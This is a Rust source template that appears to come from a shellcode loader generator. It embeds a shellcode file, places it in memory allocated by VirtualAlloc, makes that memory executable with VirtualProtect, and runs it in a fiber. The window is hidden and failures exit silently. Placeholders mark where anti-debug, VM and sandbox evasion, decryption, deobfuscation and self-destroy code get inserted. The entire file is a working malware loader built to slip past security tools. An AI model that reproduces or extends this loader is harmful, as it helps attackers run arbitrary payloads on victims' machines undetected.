#![windows_subsystem = "windows"]
#![allow(non_snake_case)]
#![allow(unused_imports)]

use std::mem::transmute;
use std::ptr::{copy, null};
use windows_sys::Win32::Foundation::{GetLastError, FALSE};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{ConvertThreadToFiber, CreateFiber, SwitchToFiber};

{{ENCRYPTION_IMPORTS}}
{{ANTIDEBUG_IMPORTS}}
{{VM_IMPORTS}}
{{SANDBOX_IMPORTS}}
{{DEOBFUSCATION_IMPORTS}}

{{ANTIDEBUG_FUNCTION}}
{{VM_FUNCTION}}
{{SANDBOX_FUNCTION}}
{{DECRYPTION_FUNCTION}}
{{DEOBFUSCATION_FUNCTION}}

fn main() {

    {{SELF-DESTROY}}
    {{DEBUG_PRIVILEGE}}
    {{VM}}
    {{SANDBOX}}
    {{ANTIDEBUG}}

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }
    let vec_size = vec.len();

    {{DEOBFUSCATION}}
    {{DECRYPTION}}

    unsafe {
        let main_fiber = ConvertThreadToFiber(null());
        if main_fiber.is_null() {
            //panic!("[-]ConvertThreadToFiber failed: {}!", GetLastError());
            std::process::exit(0);
        }

        let addr = VirtualAlloc(
            null(),
            vec_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            //panic!("[-]VirtualAlloc failed: {}!", GetLastError());
            std::process::exit(0);
        }

        let mut old = PAGE_READWRITE;
        copy(vec.as_ptr(), addr.cast(), vec_size);
        let res = VirtualProtect(addr, vec_size, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            //panic!("[-]VirtualProtect failed: {}!", GetLastError());
            std::process::exit(0);
        }

        let func = transmute(addr);
        let fiber = CreateFiber(0, func, null());
        if fiber.is_null() {
            //panic!("[-]CreateFiber failed: {}!", GetLastError());
            std::process::exit(0);
        }

        SwitchToFiber(fiber);
        SwitchToFiber(main_fiber);
    }
}

{{DLL_MAIN}}